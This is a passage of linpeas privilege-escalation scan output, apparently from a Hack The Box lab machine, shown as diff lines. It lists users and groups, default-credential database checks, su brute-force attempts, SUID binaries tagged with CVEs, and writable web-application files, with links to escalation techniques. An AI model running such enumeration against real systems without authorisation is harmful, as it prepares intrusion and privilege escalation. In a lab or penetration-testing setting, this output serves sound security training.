+/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
+gdb wasn't found in PATH
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin
+
+[+] Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+It's not possible to brute-force su.
+
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
+uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
+uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
+uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
+uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
+uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
+uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
+uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+uid=108(landscape) gid=112(landscape) groups=112(landscape)
+uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=111(mysql) gid=114(mysql) groups=114(mysql)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+
+[+] Login now
+ 16:02:44 up  1:03,  0 users,  load average: 0.28, 0.08, 0.13
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+jimmy    tty1                          Thu Nov 21 16:18 - down   (00:15)
+reboot   system boot  4.15.0-70-generi Thu Nov 21 16:17 - 16:34  (00:16)
+jimmy    tty1                          Thu Nov 21 16:01 - down   (00:16)
+reboot   system boot  4.15.0-70-generi Thu Nov 21 16:00 - 16:17  (00:16)
+jimmy    tty1                          Thu Nov 21 14:03 - down   (00:12)
+reboot   system boot  4.15.0-70-generi Thu Nov 21 13:53 - 14:15  (00:22)
+jimmy    tty1                          Thu Nov 21 13:52 - down   (00:00)
+reboot   system boot  4.15.0-70-generi Thu Nov 21 13:45 - 13:52  (00:07)
+
+wtmp begins Thu Nov 21 13:45:00 2019
+
+[+] Last time logon each user
+Username         Port     From             Latest
+root             tty1                      Sat Jan  4 21:23:05 +0000 2020
+jimmy            pts/1    10.10.14.3       Thu Jan  2 20:50:03 +0000 2020
+joanna           pts/2    10.10.14.3       Thu Jan  2 21:12:40 +0000 2020
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql  Ver 14.14 Distrib 5.7.28, for Linux (x86_64) using  EditLine wrapper
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
+Found readable /etc/mysql/my.cnf
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mysql.conf.d/
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.29 (Ubuntu)
+Server built:   2019-09-16T12:58:48
+/etc/apache2/sites-enabled/internal.conf:    ServerName internal.openadmin.htb
+/etc/apache2/sites-enabled/openadmin.conf:	ServerName openadmin.htb
+PHP exec extensions
+/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
+/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
+/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+Found 
+cat: '': No such file or directory
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+/usr/share/doc/rsync/examples/rsyncd.conf
+[ftp]
+	comment = public archive
+	path = /var/www/pub
+	use chroot = yes
+	lock file = /var/lock/rsyncd
+	read only = yes
+	list = yes
+	uid = nobody
+	gid = nogroup
+	strict modes = yes
+	ignore errors = no
+	ignore nonreadable = yes
+	transfer logging = no
+	timeout = 600
+	refuse options = checksum dry-run
+	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
+
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+ Not Found
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Searching ldap directories and their hashes
+/etc/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+PubkeyAuthentication yes
+ChallengeResponseAuthentication no
+UsePAM yes
+PasswordAuthentication yes
+  --> Some certificates were found (out limited):
+/etc/pollinate/entropy.ubuntu.com.pem
+
+ --> /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+krb5.conf Not Found
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+cached hashes Not Found
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+No Sockets found in /run/screen/S-www-data.
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+dovecot credentials Not Found
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+[+] Searching IRSSI files
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/newgrp  --->  HP-UX_10.20
+/usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+/usr/bin/newgidmap
+/usr/bin/sudo  --->  /sudo$
+/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/bin/newuidmap
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn  --->  SuSE_9.3/10
+/usr/bin/gpasswd
+/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+/bin/ping
+/bin/umount  --->  BSD/Linux(08-1996)
+/bin/su
+/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/bin/fusermount
+/snap/core/7270/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/snap/core/7270/bin/ping
+/snap/core/7270/bin/ping6
+/snap/core/7270/bin/su
+/snap/core/7270/bin/umount  --->  BSD/Linux(08-1996)
+/snap/core/7270/usr/bin/chfn  --->  SuSE_9.3/10
+/snap/core/7270/usr/bin/chsh
+/snap/core/7270/usr/bin/gpasswd
+/snap/core/7270/usr/bin/newgrp  --->  HP-UX_10.20
+/snap/core/7270/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/snap/core/7270/usr/bin/sudo  --->  /sudo$
+/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/7270/usr/lib/openssh/ssh-keysign
+/snap/core/7270/usr/lib/snapd/snap-confine
+/snap/core/7270/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+/snap/core/8039/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/snap/core/8039/bin/ping
+/snap/core/8039/bin/ping6
+/snap/core/8039/bin/su
+/snap/core/8039/bin/umount  --->  BSD/Linux(08-1996)
+/snap/core/8039/usr/bin/chfn  --->  SuSE_9.3/10
+/snap/core/8039/usr/bin/chsh
+/snap/core/8039/usr/bin/gpasswd
+/snap/core/8039/usr/bin/newgrp  --->  HP-UX_10.20
+/snap/core/8039/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/snap/core/8039/usr/bin/sudo  --->  /sudo$
+/snap/core/8039/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8039/usr/lib/openssh/ssh-keysign
+/snap/core/8039/usr/lib/snapd/snap-confine
+/snap/core/8039/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/bin/expiry
+/usr/bin/mlocate
+/usr/bin/ssh-agent
+/usr/bin/bsd-write
+/usr/bin/wall
+/usr/bin/crontab
+/usr/bin/chage
+/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+/sbin/pam_extrausers_chkpwd
+/sbin/unix_chkpwd
+/snap/core/7270/sbin/pam_extrausers_chkpwd
+/snap/core/7270/sbin/unix_chkpwd
+/snap/core/7270/usr/bin/chage
+/snap/core/7270/usr/bin/crontab
+/snap/core/7270/usr/bin/dotlockfile
+/snap/core/7270/usr/bin/expiry
+/snap/core/7270/usr/bin/mail-lock
+/snap/core/7270/usr/bin/mail-touchlock
+/snap/core/7270/usr/bin/mail-unlock
+/snap/core/7270/usr/bin/ssh-agent
+/snap/core/7270/usr/bin/wall
+/snap/core/7270/usr/lib/snapd/snap-confine
+/snap/core/8039/sbin/pam_extrausers_chkpwd
+/snap/core/8039/sbin/unix_chkpwd
+/snap/core/8039/usr/bin/chage
+/snap/core/8039/usr/bin/crontab
+/snap/core/8039/usr/bin/dotlockfile
+/snap/core/8039/usr/bin/expiry
+/snap/core/8039/usr/bin/mail-lock
+/snap/core/8039/usr/bin/mail-touchlock
+/snap/core/8039/usr/bin/mail-unlock
+/snap/core/8039/usr/bin/ssh-agent
+/snap/core/8039/usr/bin/wall
+/snap/core/8039/usr/lib/snapd/snap-confine
+
+[+] Cheking missconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/usr/local/lib/x86_64-linux-gnu
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Shell capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Files with capabilities:
+/usr/bin/mtr-packet = cap_net_raw+ep
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+
+[+] Files with ACLs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+[+] Unexpected folders in root
+/lost+found
+
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+total 28
+drwxr-xr-x  2 root root 4096 Jan  2  2020 .
+drwxr-xr-x 93 root root 4096 Jan  2  2020 ..
+-rw-r--r--  1 root root   96 Aug 19  2018 01-locale-fix.sh
+-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
+-rw-r--r--  1 root root  825 Jun  5  2019 apps-bin-path.sh
+-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
+-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read opasswd file? ............. No
+[+] Can I write in network-scripts? ...... No
+[+] Can I read root folder? .............. No
+
+[+] Searching root files in home dirs (limit 30)
+/home
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/syslog
+/var/log/journal/44bf1480ab2c456192be5f80ba18261f/system.journal
+/var/log/kern.log
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+
+[+] Files inside /home/www-data (limit 20)
+
+[+] Files inside others home (limit 20)
+
+[+] Searching installed mail applications
+
+[+] Mails (limit 50)
+
+[+] Backup files?
+-rw-r--r-- 1 root root 7905 Nov 12  2019 /lib/modules/4.15.0-70-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 7857 Nov 12  2019 /lib/modules/4.15.0-70-generic/kernel/drivers/power/supply/wm831x_backup.ko
+-rw-r--r-- 1 root root 35544 May 14  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 2746 Jun  4  2019 /usr/share/man/man8/vgcfgbackup.8.gz
+-rw-r--r-- 1 root root 11755 Nov 21  2019 /usr/share/info/dir.old
+-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
+-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
+-rw-r--r-- 1 root root 0 Nov 12  2019 /usr/src/linux-headers-4.15.0-70-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 0 Nov 12  2019 /usr/src/linux-headers-4.15.0-70-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 217491 Nov 12  2019 /usr/src/linux-headers-4.15.0-70-generic/.config.old
+-rw-r--r-- 1 root root 2765 Aug  5  2019 /etc/apt/sources.list.curtin.old
+-rw-rw-r-- 1 www-data www-data 920 Oct  6  2019 /var/www/html/artwork/fonts/flaticon/backup.txt
+-rw-rw-r-- 1 www-data www-data 892 Sep 29  2019 /var/www/html/marga/fonts/flaticon/backup.txt
+-rw-rw-r-- 1 www-data www-data 896 May  6  2019 /var/www/html/marga/fonts/flaticon-1/backup.txt
+
+[+] Searching tables inside readable .db/.sqlite files (limit 100)
+
+[+] Web files?(output limit)
+/var/www/:
+total 16K
+drwxr-xr-x  4 root     root     4.0K Nov 22  2019 .
+drwxr-xr-x 14 root     root     4.0K Nov 21  2019 ..
+drwxr-xr-x  6 www-data www-data 4.0K Nov 22  2019 html
+drwxrwx---  2 jimmy    internal 4.0K Nov 23  2019 internal
+lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
+
+/var/www/html:
+total 36K
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r-- 1 root root 2319 Apr  4  2018 /etc/bash.bashrc
+-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
+-rw-r--r-- 1 root root 3106 Sep 27  2019 /usr/share/base-files/dot.bashrc
+-rw-r--r-- 1 root root 2889 Dec  4  2017 /usr/share/byobu/profiles/bashrc
+-rw-r--r-- 1 root root 2778 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+-rw-r--r-- 1 root root 802 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+drwxrwxr-x 8 www-data www-data 4096 Nov 22  2019 /var/www/html/marga/.git
+-rw-rw-r-- 1 www-data www-data 271 Sep 30  2019 /var/www/html/marga/.git/config
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups, /private/tmp /private/var/at/tmp /private/var/tmp (limit 70)
+./linpeas.sh: 2517: ./linpeas.sh: f: not found
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/mqueue/linpeas.txt
+/dev/shm
+/opt/ona
+/opt/ona/.gitignore
+/opt/ona/README.md
+/opt/ona/VERSION
+/opt/ona/bin
+/opt/ona/bin/README
+/opt/ona/docs
+/opt/ona/docs/CODING_STANDARDS
+/opt/ona/docs/DEVELOPERS
+/opt/ona/docs/INSTALL
+/opt/ona/docs/LICENSE
+/opt/ona/docs/UPGRADES
+/opt/ona/etc
+/opt/ona/etc/README
+/opt/ona/sql
+/opt/ona/sql/EXAMPLE.sql.disable
+/opt/ona/sql/list_all_hosts.sql
+/opt/ona/www
+/opt/ona/www/.htaccess.example
+/opt/ona/www/config
+/opt/ona/www/config/auth_ldap.config.php
+/opt/ona/www/config/config.inc.php
+/opt/ona/www/config_dnld.php
+/opt/ona/www/dcm.php
+/opt/ona/www/images
+/opt/ona/www/images/silk
+/opt/ona/www/images/silk/icons
+/opt/ona/www/images/silk/readme.html
+/opt/ona/www/images/silk/readme.txt
+/opt/ona/www/include
+/opt/ona/www/include/DifferenceEngine.php
+/opt/ona/www/include/adodb5
+/opt/ona/www/include/adodb5/.mailmap
+/opt/ona/www/include/adodb5/LICENSE.md
+/opt/ona/www/include/adodb5/README.md
+/opt/ona/www/include/adodb5/adodb-active-record.inc.php
+/opt/ona/www/include/adodb5/adodb-active-recordx.inc.php
+/opt/ona/www/include/adodb5/adodb-csvlib.inc.php
+/opt/ona/www/include/adodb5/adodb-datadict.inc.php
+/opt/ona/www/include/adodb5/adodb-error.inc.php
+/opt/ona/www/include/adodb5/adodb-errorhandler.inc.php
+/opt/ona/www/include/adodb5/adodb-errorpear.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/include/adodb5/datadict/datadict-access.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-db2.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-firebird.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-generic.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-ibase.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-informix.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-mssql.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-mssqlnative.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-mysql.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-oci8.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/include/adodb5/drivers
+/opt/ona/www/include/adodb5/drivers/adodb-access.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-ado.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-ado5.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-ado_access.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-ado_mssql.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-ads.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-borland_ibase.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-csv.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-db2.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-db2oci.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/include/adodb5/lang
+/opt/ona/www/include/adodb5/lang/adodb-ar.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-bg.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-ca.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-cn.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-cz.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-da.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-de.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-en.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-eo.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-es.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/include/adodb5/pivottable.inc.php
+/opt/ona/www/include/adodb5/rsfilter.inc.php
+/opt/ona/www/include/adodb5/server.php
+/opt/ona/www/include/adodb5/toexport.inc.php
+/opt/ona/www/include/adodb5/tohtml.inc.php
+/opt/ona/www/include/adodb5/xmlschema.dtd
+/opt/ona/www/include/adodb5/xmlschema03.dtd
+/opt/ona/www/include/adodb5/xsl
+/opt/ona/www/include/adodb5/xsl/convert-0.1-0.2.xsl
+/opt/ona/www/include/adodb5/xsl/convert-0.1-0.3.xsl
+/opt/ona/www/include/adodb5/xsl/convert-0.2-0.1.xsl
+/opt/ona/www/include/adodb5/xsl/convert-0.2-0.3.xsl
+/opt/ona/www/include/adodb5/xsl/remove-0.2.xsl
+/opt/ona/www/include/adodb5/xsl/remove-0.3.xsl
+/opt/ona/www/include/adodb_sessions.inc.php
+/opt/ona/www/include/auth
+/opt/ona/www/include/auth/ldap.class.php
+/opt/ona/www/include/auth/local.class.php
+/opt/ona/www/include/functions_auth.inc.php
+/opt/ona/www/include/functions_db.inc.php
+/opt/ona/www/include/functions_general.inc.php
+/opt/ona/www/include/functions_gui.inc.php
+/opt/ona/www/include/functions_network_map.inc.php
+/opt/ona/www/include/html_desktop.inc.php
+/opt/ona/www/include/html_style_sheet.inc.php
+/opt/ona/www/include/js
+/opt/ona/www/include/js/bignumber.js
+/opt/ona/www/include/js/global.js
+/opt/ona/www/include/unknown_module_msg.inc.php
+/opt/ona/www/include/xajax_0.2.4
+/opt/ona/www/include/xajax_0.2.4/LICENSE.txt
+/opt/ona/www/include/xajax_0.2.4/README.txt
+/opt/ona/www/include/xajax_0.2.4/xajax.inc.php
+/opt/ona/www/include/xajax_0.2.4/xajaxCompress.php
+/opt/ona/www/include/xajax_0.2.4/xajaxResponse.inc.php
+/opt/ona/www/include/xajax_0.2.4/xajax_js
+/opt/ona/www/include/xajax_0.2.4/xajax_js/xajax.js
+/opt/ona/www/include/xajax_0.2.4/xajax_js/xajax_uncompressed.js
+/opt/ona/www/include/xajax_drag
+/opt/ona/www/include/xajax_drag/drag.inc.php
+/opt/ona/www/include/xajax_drag/drag.js
+/opt/ona/www/include/xajax_setup.inc.php
+/opt/ona/www/include/xajax_suggest
+/opt/ona/www/include/xajax_suggest/suggest.css
+/opt/ona/www/include/xajax_suggest/suggest.inc.php
+/opt/ona/www/include/xajax_suggest/suggest.js
+/opt/ona/www/include/xajax_webwin
+/opt/ona/www/include/xajax_webwin/webwin.css
+/opt/ona/www/include/xajax_webwin/webwin.inc.php
+/opt/ona/www/include/xajax_webwin/webwin.js
+/opt/ona/www/include/xajax_webwin/webwinTT.js
+/opt/ona/www/index.php
+/opt/ona/www/local
+/opt/ona/www/local/config
+/opt/ona/www/local/config/database_settings.inc.php
+/opt/ona/www/local/config/motd.txt.example
+/opt/ona/www/local/config/run_installer
+/opt/ona/www/local/nmap_scans
+/opt/ona/www/local/nmap_scans/subnets
+/opt/ona/www/local/nmap_scans/subnets/nmap.xsl
+/opt/ona/www/local/plugins
+/opt/ona/www/local/plugins/README
+/opt/ona/www/login.php
+/opt/ona/www/logout.php
+/opt/ona/www/modules
+/opt/ona/www/modules/get_module_list.inc.php
+/opt/ona/www/modules/ipcalc.inc.php
+/opt/ona/www/modules/mangle.inc.php
+/opt/ona/www/modules/mysql_purge_logs.inc.php
+/opt/ona/www/modules/ona
+/opt/ona/www/modules/ona/block.inc.php
+/opt/ona/www/modules/ona/configuration.inc.php
+/opt/ona/www/modules/ona/custom_attribute.inc.php
+/opt/ona/www/modules/ona/dhcp_entry.inc.php
+/opt/ona/www/modules/ona/dhcp_failover.inc.php
+/opt/ona/www/modules/ona/dhcp_pool.inc.php
+/opt/ona/www/modules/ona/dhcp_server.inc.php
+/opt/ona/www/modules/ona/dns_record.inc.php
+/opt/ona/www/modules/ona/domain.inc.php
+/opt/ona/www/modules/ona/domain_server.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/modules/permissions.inc.php
+/opt/ona/www/modules/report_run.inc.php
+/opt/ona/www/modules/sql.inc.php
+/opt/ona/www/plugins
+/opt/ona/www/plugins/README
+/opt/ona/www/plugins/ona_nmap_scans
+/opt/ona/www/plugins/ona_nmap_scans/install.php
+/opt/ona/www/plugins/ona_nmap_scans/nmap.xsl
+/opt/ona/www/plugins/ona_nmap_scans/nmap_scan_cron
+/opt/ona/www/plugins/ona_nmap_scans/ona_nmap_scans.inc.php
+/opt/ona/www/plugins/ona_nmap_scans/plugin_info.php
+/opt/ona/www/plugins/ona_nmap_scans/report.inc.php
+/opt/ona/www/plugins/ona_nmap_scans/report_item.inc.php
+/opt/ona/www/plugins/ona_nmap_scans/sql
+/opt/ona/www/plugins/ona_nmap_scans/sql/check_last_response.sql
+/opt/ona/www/plugins/ona_nmap_scans/sql/nmap_subnets.sql
+/opt/ona/www/plugins/ona_nmap_scans/sql/nmap_subnets_only_yes.sql
+/opt/ona/www/winc
